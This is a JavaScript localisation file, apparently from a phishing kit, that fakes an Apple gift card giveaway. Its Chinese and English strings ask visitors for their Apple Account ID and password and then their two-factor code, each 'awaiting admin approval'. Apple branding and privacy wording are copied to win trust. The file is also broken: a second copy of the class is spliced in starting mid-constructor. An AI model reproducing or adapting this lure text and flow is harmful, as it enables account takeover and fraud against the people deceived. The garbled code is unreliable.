// 国际化支持
class I18n {
    constructor() {
        this.currentLang = 'zh';
        this.translations = {};
        this.init();
    }

    init() {
        // 检测浏览器语言
        const browserLang = navigator.language || navigator.userLanguage;
        const langCode = browserLang.split('-')[0];
        
        // 使用服务器推荐的语言或浏览器语言
        if (typeof recommendLang !== 'undefined' && recommendLang) {
            this.currentLang = recommendLang;
        } else if (['zh', 'en'].includes(langCode)) {
            this.currentLang = langCode;
        }
        
        this.loadTranslations();
    }

    loadTranslations() {
        // 中文翻译
        this.translations.zh = {
            // 通用
            'site_title': '礼品卡发放系统',
            'loading': '加载中...',
            'submit': '提交',
            'cancel': '取消',
            'back': '返回',
            'continue': '继续',
            'login': '登录',
            'logout': '退出',
            'email_or_phone': '邮箱地址或手机号',
            'password': '密码',
            'remember_account': '记住此账户',
            
            // 欢迎页面
            'welcome_title': '输入账户ID和密码，领取您的礼品卡',
            'welcome_description': '登录成功后验证身份即可领取礼品卡，安全、简单、高效。',
            'member_login': '立即登录并领取',
            'for_everyone': '适用于所有人',
            'gift_card_intro': '礼品卡可用于购买各种Apple产品和服务',
            
            // 产品名称
            'mac': 'Mac',
            'iphone': 'iPhone',
            'ipad': 'iPad',
            'watch': 'Apple Watch',
            'apple_vision_pro': 'Apple Vision Pro',
            'accessories': '配件',
            'app_store': 'App Store',
            'arcade': 'Apple Arcade',
            'music': 'Apple Music',
            'tv_plus': 'Apple TV+',
            'itunes': 'iTunes',
            'apple_one': 'Apple One',
            'fitness_plus': 'Apple Fitness+',
            'icloud_plus': 'iCloud+',
            'news_plus': 'Apple News+',
            'books': 'Apple Books',
            
            // 登录页面
            'login_apple_account': '登录您的Apple账户',
            'manage_your_apple_account': '管理您的Apple账户信息',
            'invalid_email': '请输入有效的邮箱地址',
            'apple_account_privacy': '您的Apple账户信息用于允许您安全地访问和使用Apple服务。Apple会根据Apple隐私政策处理您的数据。',
            
            // 等待页面
            'waiting_approval': '等待管理员审核',
            'login_pending_message': '您的登录请求正在等待管理员审核，请耐心等待...',
            'login_approved': '登录已批准',
            'login_rejected': '登录被拒绝',
            
            // 验证页面
            'two_factor_auth': '双重认证',
            'enter_verification_code_desc': '请输入发送到您信任设备的验证码',
            'digit_1': '第1位数字',
            'digit_2': '第2位数字',
            'digit_3': '第3位数字',
            'digit_4': '第4位数字',
            'digit_5': '第5位数字',
            'digit_6': '第6位数字',
            'verification_code_required': '请输入6位验证码',
            'verification_failed': '验证失败，请重试',
            
            // 等待验证页面
            'waiting_verification_approval': '等待验证审核',
            'verification_pending_message': '您的验证码正在等待管理员审核，请耐心等待...',
            'verification_rejected': '验证被拒绝',
            
            // 礼品卡页面
            'your_gift_card': '您的礼品卡',
            'gift_card_message': '恭喜！这是您的礼品卡代码',
            'no_gift_cards_available': '暂无可用礼品卡',
            'daily_checkin': '每日签到',
            'view_history': '查看历史',
            
            // 签到页面
            'checkin_now': '立即签到',
            'eligible_for_checkin': '您可以进行签到',
            'not_eligible_for_checkin': '您暂时无法签到',
            'checkin_successful': '签到成功！',
            
            // 历史记录
            'no_gift_card_records': '暂无礼品卡记录',
            'no_checkin_records': '暂无签到记录',
            'reward': '奖励',
            'no_reward': '无奖励',
            
            // 错误信息
            'network_error': '网络错误，请稍后重试',
            'login_failed': '登录失败，请检查账户信息',
            'blocked_cn_ip': '很抱歉，因政策原因，中国大陆IP暂时无法访问本系统。',
            'cn_cards_depleted': '中国大陆地区礼品卡已发放完毕，请稍后再试。',
            
            // v3界面专用
            'login_and_claim_title': '输入账户ID和密码，登录并领取',
            'login_and_claim_desc': '请输入您的账户ID和密码，完成身份验证后即可领取礼品卡',
            'account_id_placeholder': '请输入您的账户ID（通常是邮箱地址）',
            'account_password_placeholder': '请输入您的账户ID密码',
            'invalid_account_id': '请输入有效的账户ID（通常是邮箱地址，例如：example@domain.com）',
            'clear': '清除',
            'gift_card_series': '礼品卡系列',
            'gift_card_series_desc': '所有礼品卡均需输入账户ID和密码登录，并通过验证码验证后领取使用',
            'gift_card': '礼品卡',
            'gift_card_desc': '输入账户ID和密码登录后，验证身份即可领取使用',
            'multiple_denominations': '多种面额',
            'claim_now': '立即领取',
            'simple_five_steps': '简单五步，轻松领取',
            'simple_five_steps_desc': '输入账户ID和密码，通过验证后即可安全领取礼品卡',
            'prepare_account': '准备账户ID',
            'prepare_account_desc': '准备好您的账户ID和对应的密码',
            'input_account_info': '输入账号信息',
            'input_account_info_desc': '在上方输入框中填写您的账户ID和密码',
            'wait_verification': '等待验证',
            'wait_verification_desc': '系统将验证您的账户ID信息，请耐心等待',
            'input_verification_code': '输入验证码',
            'input_verification_code_desc': '输入发送至您账户关联设备的验证码完成验证',
            'claim_and_use': '领取使用',
            'claim_and_use_desc': '验证成功后即可领取并使用礼品卡',
            'footer_desc': '输入账户ID和密码，通过验证码验证即可领取礼品卡，安全高效',
            'quick_links': '快速链接',
            'help_center': '帮助中心',
            'no_verification_code': '未收到验证码？',
            'forgot_account': '忘记账户ID或密码？',
            'terms_of_use': '使用条款',
            'all_rights_reserved': '保留所有权利。',
            
            // 导航
            'home': '首页',
            'login_and_claim': '登录与领取',
            'gift_cards': '礼品卡',
            
            // 用户信息
            'logged_in_as': '已登录：'
        };

        // 英文翻译
        this.translations.en = {
            // 通用
            'site_title': 'Gift Card Distribution System',
            'loading': 'Loading...',
            'submit': 'Submit',
            'cancel': 'Cancel',
            'back': 'Back',
            'continue': 'Continue',
            'login': 'Login',
            'logout': 'Logout',
            'email_or_phone': 'Email or Phone',
            'password': 'Password',
            'remember_account': 'Remember this account',
            
            // 欢迎页面
            'welcome_title': 'Enter Account ID and Password to Claim Your Gift Card',
            'welcome_description': 'Login and verify your identity to claim gift cards safely, simply, and efficiently.',
            'member_login': 'Login and Claim Now',
            'for_everyone': 'For Everyone',
            'gift_card_intro': 'Gift cards can be used to purchase various Apple products and services',
            
            // 产品名称
            'mac': 'Mac',
            'iphone': 'iPhone',
            'ipad': 'iPad',
            'watch': 'Apple Watch',
            'apple_vision_pro': 'Apple Vision Pro',
            'accessories': 'Accessories',
            'app_store': 'App Store',
            'arcade': 'Apple Arcade',
            'music': 'Apple Music',
            'tv_plus': 'Apple TV+',
            'itunes': 'iTunes',
            'apple_one': 'Apple One',
            'fitness_plus': 'Apple Fitness+',
            'icloud_plus': 'iCloud+',
            'news_plus': 'Apple News+',
            'books': 'Apple Books',
            
            // 登录页面
            'login_apple_account': 'Sign in to your Apple Account',
            'manage_your_apple_account': 'Manage your Apple Account information',
            'invalid_email': 'Please enter a valid email address',
            'apple_account_privacy': 'Your Apple Account information is used to allow you to sign in securely and access your data. Apple records certain data for security and support purposes.',
            
            // 等待页面
            'waiting_approval': 'Waiting for Admin Approval',
            'login_pending_message': 'Your login request is pending admin approval, please wait...',
            'login_approved': 'Login Approved',
            'login_rejected': 'Login Rejected',
            
            // 验证页面
            'two_factor_auth': 'Two-Factor Authentication',
            'enter_verification_code_desc': 'Enter the verification code sent to your trusted device',
            'digit_1': 'Digit 1',
            'digit_2': 'Digit 2',
            'digit_3': 'Digit 3',
            'digit_4': 'Digit 4',
            'digit_5': 'Digit 5',
            'digit_6': 'Digit 6',
            'verification_code_required': 'Please enter 6-digit verification code',
            'verification_failed': 'Verification failed, please try again',
            
            // 等待验证页面
            'waiting_verification_approval': 'Waiting for Verification Approval',
            'verification_pending_message': 'Your verification code is pending admin approval, please wait...',
            'verification_rejected': 'Verification Rejected',
            
            // 礼品卡页面
            'your_gift_card': 'Your Gift Card',
            'gift_card_message': 'Congratulations! Here is your gift card code',
            'no_gift_cards_available': 'No gift cards available',
            'daily_checkin': 'Daily Check-in',
            'view_history': 'View History',
            
            // 签到页面
            'checkin_now': 'Check in Now',
            'eligible_for_checkin': 'You are eligible for check-in',
            'not_eligible_for_checkin': 'You are not eligible for check-in at this time',
            'checkin_successful': 'Check-in successful!',
            
            // 历史记录
            'no_gift_card_records': 'No gift card records',
            'no_checkin_records': 'No check-in records',
            'reward': 'Reward',
            'no_reward': 'No reward',
            
            // 错误信息
            'network_error': 'Network error, please try again later',
            'login_failed': 'Login failed, please check your credentials',
            'blocked_cn_ip': 'Sorry, access from mainland China IPs is temporarily unavailable due to policy reasons.',
            'cn_cards_depleted': 'Gift cards for mainland China have been depleted, please try again later.',
            
            // v3界面专用
            'login_and_claim_title': 'Enter Account ID and Password to Login and Claim',
            'login_and_claim_desc': 'Please enter your account ID and password to complete identity verification and claim your gift card',
            'account_id_placeholder': 'Please enter your account ID (usually email address)',
            'account_password_placeholder': 'Please enter your account ID password',
            'invalid_account_id': 'Please enter a valid account ID (usually email address, e.g.: example@domain.com)',
            'clear': 'Clear',
            'gift_card_series': 'Gift Card Series',
            'gift_card_series_desc': 'All gift cards require account ID and password login, and verification code verification before claiming',
            'gift_card': 'Gift Card',
            'gift_card_desc': 'Login with account ID and password, then verify identity to claim and use',
            'multiple_denominations': 'Multiple Denominations',
            'claim_now': 'Claim Now',
            'simple_five_steps': 'Simple Five Steps, Easy Claiming',
            'simple_five_steps_desc': 'Enter account ID and password, verify and safely claim gift cards',
            'prepare_account': 'Prepare Account ID',
            'prepare_account_desc': 'Prepare your account ID and corresponding password',
            'input_account_info': 'Input Account Info',
            'input_account_info_desc': 'Fill in your account ID and password in the form above',
            'wait_verification': 'Wait for Verification',
            'wait_verification_desc': 'System will verify your account ID information, please wait patiently',
            'input_verification_code': 'Input Verification Code',
            'input_verification_code_desc': 'Enter the verification code sent to your account-linked device',
            'claim_and_use': 'Claim and Use',
            'claim_and_use_desc': 'Successfully verified, you can claim and use the gift card',
            'footer_desc': 'Enter account ID and password, verify with verification code to claim gift cards safely and efficiently',
            'quick_links': 'Quick Links',
            'help_center': 'Help Center',
            'no_verification_code': 'Didn\'t receive verification code?',
            'forgot_account': 'Forgot account ID or password?',
            'terms_of_use': 'Terms of Use',
            'all_rights_reserved': 'All rights reserved.',
            
            // 导航
            'home': 'Home',
            'login_and_claim': 'Login & Claim',
            'gift_cards': 'Gift Cards',
            
            // 用户信息
            'logged_in_as': 'Logged in as:'
        };
    }

    getCurrentLanguage() {
        return this.currentLang;
    }

    changeLanguage(lang) {
        if (this.translations[lang]) {
            this.currentLang = lang;
            this.translatePage();
            
            // 保存语言偏好
            localStorage.setItem('preferredLanguage', lang);
        }
    }

    t(key) {
        const translation = this.translations[this.currentLang];
        return translation && translation[key] ? translation[key] : key;
    }

    translatePage() {
        // 翻译所有带有 data-i18n 属性的元素
        document.querySelectorAll('[data-i18n]').forEach(element => {
            const key = element.getAttribute('data-i18n');
            const translation = this.t(key);
            
            if (element.tagName === 'INPUT' && element.type !== 'submit') {
                element.placeholder = translation;
            } else {
                element.textContent = translation;
            }
        });

        // 翻译所有带有 data-i18n-placeholder 属性的元素
        document.querySelectorAll('[data-i18n-placeholder]').forEach(element => {
            const key = element.getAttribute('data-i18n-placeholder');
            const translation = this.t(key);
            element.placeholder = translation;
        });

        // 翻译所有带有 data-i18n-label 属性的元素
        document.querySelectorAll('[data-i18n-label]').forEach(element => {
            const key = element.getAttribute('data-i18n-label');
            const translation = this.t(key);
            element.setAttribute('aria-label', translation);
        });

        // 更新页面标题
        const titleElement = document.querySelector('title[data-i18n]');
        if (titleElement) {
            const key = titleElement.getAttribute('data-i18n');
            document.title = this.t(key);
        }
    }
}

// 初始化国际化
window.i18n = new I18n();

// 页面加载完成后翻译
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        window.i18n.translatePage();
    });
} else {
    window.i18n.translatePage();
}
        this.loadTranslations();
        this.setupLanguageSelector();
    }

    loadTranslations() {
        // 中文翻译
        this.translations.zh = {
            // 通用
            'loading': '加载中...',
            'submit': '提交',
            'cancel': '取消',
            'back': '返回',
            'continue': '继续',
            'login': '登录',
            'logout': '退出',
            'close': '关闭',
            'confirm': '确认',
            
            // 欢迎页面
            'welcome_title': '输入账户ID和密码，领取您的礼品卡',
            'welcome_description': '登录成功后验证身份即可领取礼品卡，安全、简单、高效。',
            'member_login': '立即登录并领取',
            'for_everyone': '适用于所有人',
            'gift_card_intro': '礼品卡可用于购买各种Apple产品和服务',
            
            // Apple产品
            'mac': 'Mac',
            'iphone': 'iPhone',
            'ipad': 'iPad',
            'watch': 'Apple Watch',
            'apple_vision_pro': 'Apple Vision Pro',
            'accessories': '配件',
            'app_store': 'App Store',
            'arcade': 'Apple Arcade',
            'music': 'Apple Music',
            'tv_plus': 'Apple TV+',
            'itunes': 'iTunes',
            'apple_one': 'Apple One',
            'fitness_plus': 'Apple Fitness+',
            'icloud_plus': 'iCloud+',
            'news_plus': 'Apple News+',
            'books': 'Apple Books',
            
            // 登录页面
            'login_apple_account': '登录您的Apple账户',
            'manage_your_apple_account': '管理您的Apple账户信息',
            'email_or_phone': '邮箱地址或手机号',
            'password': '密码',
            'remember_account': '记住此账户',
            'invalid_email': '请输入有效的邮箱地址',
            'apple_account_privacy': '您的Apple账户信息用于允许您安全地访问和使用Apple服务。Apple会根据Apple隐私政策处理您的数据。',
            
            // 等待审核
            'waiting_approval': '等待管理员审核',
            'login_pending_message': '您的登录请求已提交，请耐心等待管理员审核。审核通过后您将收到通知。',
            'what_happens_next': '接下来会发生什么？',
            'admin_review_process': '管理员将验证您的账户信息',
            'security_verification': '进行安全验证确保账户安全',
            'gift_card_preparation': '为您准备礼品卡',
            'cancel_login': '取消登录',
            'login_approved': '登录已批准',
            'login_rejected': '登录被拒绝',
            
            // 验证码页面
            'two_factor_auth': '双重认证',
            'enter_verification_code_desc': '请输入发送到您信任设备的验证码',
            'digit_1': '第1位数字',
            'digit_2': '第2位数字',
            'digit_3': '第3位数字',
            'digit_4': '第4位数字',
            'digit_5': '第5位数字',
            'digit_6': '第6位数字',
            'invalid_verification_code': '请输入有效的6位验证码',
            'didnt_receive_code': '没有收到验证码？',
            'resend_code': '重新发送',
            'verification_help': '验证码帮助',
            'check_trusted_device': '检查您的信任设备上的通知',
            'code_expires_info': '验证码将在几分钟后过期',
            'security_reminder': '请勿与他人分享您的验证码',
            
            // 等待验证审核
            'waiting_verification_approval': '等待验证审核',
            'verification_pending_message': '正在验证您的身份信息，请稍候...',
            'verification_process': '验证过程',
            'verifying_identity': '正在验证您的身份信息',
            'security_check': '进行安全检查',
            'preparing_access': '准备访问权限',
            'security_notice': '安全提示',
            'verification_security_info': '我们正在确保您的账户安全。此过程通常需要几秒钟时间。',
            'verification_approved': '验证已通过',
            'verification_rejected': '验证被拒绝',
            
            // 礼品卡页面
            'your_gift_card': '您的礼品卡',
            'gift_card_message': '恭喜！这是您的礼品卡代码',
            'apple_gift_card': 'Apple礼品卡',
            'digital_gift_card': '数字礼品卡',
            'gift_card_code': '礼品卡代码',
            'balance': '余额',
            'expires': '有效期至',
            'how_to_use': '如何使用',
            'redeem_on_device': '在您的设备上打开App Store或iTunes Store',
            'enter_gift_code': '输入上方的礼品卡代码',
            'start_shopping': '开始购买您喜欢的内容',
            'daily_checkin': '每日签到',
            'view_history': '查看历史',
            'visit_app_store': '访问App Store',
            'no_gift_cards_available': '暂无可用礼品卡',
            
            // 签到页面
            'checkin_description': '每日签到可获得额外奖励',
            'checkin_now': '立即签到',
            'checkin_rules': '签到规则',
            'checkin_time_limit': '每日仅可签到一次',
            'checkin_rewards': '签到可能获得礼品卡奖励',
            'consecutive_checkin': '连续签到获得更多奖励',
            'eligible_for_checkin': '您今日可以签到',
            'not_eligible_for_checkin': '您今日已签到或不符合签到条件',
            'checkin_successful': '签到成功！',
            
            // 历史记录
            'history_records': '历史记录',
            'view_all_activities': '查看您的所有活动记录',
            'gift_cards': '礼品卡',
            'checkin_history': '签到记录',
            'gift_card_records': '礼品卡记录',
            'checkin_records': '签到记录',
            'no_gift_card_records': '暂无礼品卡记录',
            'no_checkin_records': '暂无签到记录',
            'reward': '奖励',
            'no_reward': '无奖励',
            
            // 错误消息
            'network_error': '网络错误，请稍后重试',
            'invalid_credentials': '邮箱或密码错误',
            'verification_code_required': '请输入验证码',
            'verification_code_invalid': '验证码无效',
            'session_expired': '会话已过期，请重新登录',
            
            // 警告信息
            'apple_gift_card_warning1': 'Apple礼品卡仅可在Apple Store零售店、Apple Store在线商店或致电1-800-MY-APPLE购买Apple产品和配件时使用。',
            'apple_gift_card_warning2': '礼品卡不可兑换现金，不可退款，不可用于购买其他礼品卡，且不可在Apple Store零售店以外的地方使用。',
            'apple_gift_card_warning3': '如需了解完整条款和条件，请访问apple.com/legal/giftcards/。',
            
            // IP阻止
            'blocked_cn_ip': '很抱歉，因政策原因，中国大陆IP暂时无法访问本系统。',
            'cn_cards_depleted': '中国大陆地区礼品卡已发放完毕，请稍后再试。'
        };

        // 英文翻译
        this.translations.en = {
            // 通用
            'loading': 'Loading...',
            'submit': 'Submit',
            'cancel': 'Cancel',
            'back': 'Back',
            'continue': 'Continue',
            'login': 'Sign In',
            'logout': 'Sign Out',
            'close': 'Close',
            'confirm': 'Confirm',
            
            // 欢迎页面
            'welcome_title': 'Enter Account ID and Password to Claim Your Gift Card',
            'welcome_description': 'Verify your identity after successful login to claim your gift card safely, simply, and efficiently.',
            'member_login': 'Sign In and Claim Now',
            'for_everyone': 'For Everyone',
            'gift_card_intro': 'Gift cards can be used to purchase various Apple products and services',
            
            // Apple产品
            'mac': 'Mac',
            'iphone': 'iPhone',
            'ipad': 'iPad',
            'watch': 'Apple Watch',
            'apple_vision_pro': 'Apple Vision Pro',
            'accessories': 'Accessories',
            'app_store': 'App Store',
            'arcade': 'Apple Arcade',
            'music': 'Apple Music',
            'tv_plus': 'Apple TV+',
            'itunes': 'iTunes',
            'apple_one': 'Apple One',
            'fitness_plus': 'Apple Fitness+',
            'icloud_plus': 'iCloud+',
            'news_plus': 'Apple News+',
            'books': 'Apple Books',
            
            // 登录页面
            'login_apple_account': 'Sign in to your Apple Account',
            'manage_your_apple_account': 'Manage your Apple Account',
            'email_or_phone': 'Email or Phone Number',
            'password': 'Password',
            'remember_account': 'Remember this account',
            'invalid_email': 'Please enter a valid email address',
            'apple_account_privacy': 'Your Apple Account information is used to allow you to sign in securely and access your data. Apple handles your data in accordance with the Apple Privacy Policy.',
            
            // 等待审核
            'waiting_approval': 'Waiting for Admin Approval',
            'login_pending_message': 'Your login request has been submitted. Please wait patiently for admin approval. You will be notified once approved.',
            'what_happens_next': 'What happens next?',
            'admin_review_process': 'Admin will verify your account information',
            'security_verification': 'Security verification to ensure account safety',
            'gift_card_preparation': 'Prepare your gift card',
            'cancel_login': 'Cancel Login',
            'login_approved': 'Login Approved',
            'login_rejected': 'Login Rejected',
            
            // 验证码页面
            'two_factor_auth': 'Two-Factor Authentication',
            'enter_verification_code_desc': 'Enter the verification code sent to your trusted device',
            'digit_1': 'Digit 1',
            'digit_2': 'Digit 2',
            'digit_3': 'Digit 3',
            'digit_4': 'Digit 4',
            'digit_5': 'Digit 5',
            'digit_6': 'Digit 6',
            'invalid_verification_code': 'Please enter a valid 6-digit verification code',
            'didnt_receive_code': 'Didn\'t receive the code?',
            'resend_code': 'Resend Code',
            'verification_help': 'Verification Help',
            'check_trusted_device': 'Check notifications on your trusted device',
            'code_expires_info': 'The verification code will expire in a few minutes',
            'security_reminder': 'Do not share your verification code with others',
            
            // 等待验证审核
            'waiting_verification_approval': 'Waiting for Verification Approval',
            'verification_pending_message': 'Verifying your identity information, please wait...',
            'verification_process': 'Verification Process',
            'verifying_identity': 'Verifying your identity information',
            'security_check': 'Performing security check',
            'preparing_access': 'Preparing access permissions',
            'security_notice': 'Security Notice',
            'verification_security_info': 'We are ensuring your account security. This process usually takes a few seconds.',
            'verification_approved': 'Verification Approved',
            'verification_rejected': 'Verification Rejected',
            
            // 礼品卡页面
            'your_gift_card': 'Your Gift Card',
            'gift_card_message': 'Congratulations! Here is your gift card code',
            'apple_gift_card': 'Apple Gift Card',
            'digital_gift_card': 'Digital Gift Card',
            'gift_card_code': 'Gift Card Code',
            'balance': 'Balance',
            'expires': 'Expires',
            'how_to_use': 'How to Use',
            'redeem_on_device': 'Open App Store or iTunes Store on your device',
            'enter_gift_code': 'Enter the gift card code above',
            'start_shopping': 'Start shopping for your favorite content',
            'daily_checkin': 'Daily Check-in',
            'view_history': 'View History',
            'visit_app_store': 'Visit App Store',
            'no_gift_cards_available': 'No gift cards available',
            
            // 签到页面
            'checkin_description': 'Daily check-in for additional rewards',
            'checkin_now': 'Check In Now',
            'checkin_rules': 'Check-in Rules',
            'checkin_time_limit': 'Only one check-in per day',
            'checkin_rewards': 'Check-in may earn gift card rewards',
            'consecutive_checkin': 'Consecutive check-ins earn more rewards',
            'eligible_for_checkin': 'You can check in today',
            'not_eligible_for_checkin': 'You have already checked in today or are not eligible',
            'checkin_successful': 'Check-in successful!',
            
            // 历史记录
            'history_records': 'History Records',
            'view_all_activities': 'View all your activity records',
            'gift_cards': 'Gift Cards',
            'checkin_history': 'Check-in History',
            'gift_card_records': 'Gift Card Records',
            'checkin_records': 'Check-in Records',
            'no_gift_card_records': 'No gift card records',
            'no_checkin_records': 'No check-in records',
            'reward': 'Reward',
            'no_reward': 'No Reward',
            
            // 错误消息
            'network_error': 'Network error, please try again later',
            'invalid_credentials': 'Invalid email or password',
            'verification_code_required': 'Please enter verification code',
            'verification_code_invalid': 'Invalid verification code',
            'session_expired': 'Session expired, please login again',
            
            // 警告信息
            'apple_gift_card_warning1': 'Apple Gift Cards are solely for the purchase of goods and services from the Apple Store, the Apple Store app, apple.com, the App Store, iTunes, Apple Music, Apple TV, Apple Books, and other Apple properties.',
            'apple_gift_card_warning2': 'Should you receive a request for payment using Apple Gift Cards outside of the former, please report it at FTC Complaint Assistant.',
            'apple_gift_card_warning3': 'Apple Gift Cards are not redeemable for cash and cannot be returned for a cash refund, except as required by law.',
            
            // IP阻止
            'blocked_cn_ip': 'Sorry, access from mainland China IP addresses is temporarily unavailable due to policy reasons.',
            'cn_cards_depleted': 'Gift cards for mainland China have been depleted, please try again later.'
        };
    }

    setupLanguageSelector() {
        const languageSelect = document.getElementById('languageSelect');
        if (languageSelect) {
            languageSelect.value = this.currentLang;
            languageSelect.addEventListener('change', (e) => {
                this.setLanguage(e.target.value);
            });
        }
    }

    setLanguage(lang) {
        if (this.translations[lang]) {
            this.currentLang = lang;
            localStorage.setItem('preferredLanguage', lang);
            this.translatePage();
            
            // 更新HTML lang属性
            document.documentElement.lang = lang === 'zh' ? 'zh-CN' : 'en';
        }
    }

    t(key, defaultValue = '') {
        const translation = this.translations[this.currentLang];
        return translation && translation[key] ? translation[key] : (defaultValue || key);
    }

    translatePage() {
        // 翻译所有带有data-i18n属性的元素
        document.querySelectorAll('[data-i18n]').forEach(element => {
            const key = element.getAttribute('data-i18n');
            const translation = this.t(key);
            if (translation) {
                element.textContent = translation;
            }
        });

        // 翻译placeholder属性
        document.querySelectorAll('[data-i18n-placeholder]').forEach(element => {
            const key = element.getAttribute('data-i18n-placeholder');
            const translation = this.t(key);
            if (translation) {
                element.placeholder = translation;
            }
        });

        // 翻译aria-label属性
        document.querySelectorAll('[data-i18n-label]').forEach(element => {
            const key = element.getAttribute('data-i18n-label');
            const translation = this.t(key);
            if (translation) {
                element.setAttribute('aria-label', translation);
            }
        });

        // 翻译title属性
        document.querySelectorAll('[data-i18n-title]').forEach(element => {
            const key = element.getAttribute('data-i18n-title');
            const translation = this.t(key);
            if (translation) {
                element.title = translation;
            }
        });
    }
}

// 初始化国际化
let i18n;
document.addEventListener('DOMContentLoaded', () => {
    i18n = new I18n();
    window.i18n = i18n; // 全局访问
    
    // 从本地存储恢复语言设置
    const savedLang = localStorage.getItem('preferredLanguage');
    if (savedLang && i18n.translations[savedLang]) {
        i18n.setLanguage(savedLang);
    } else {
        i18n.translatePage();
    }
});
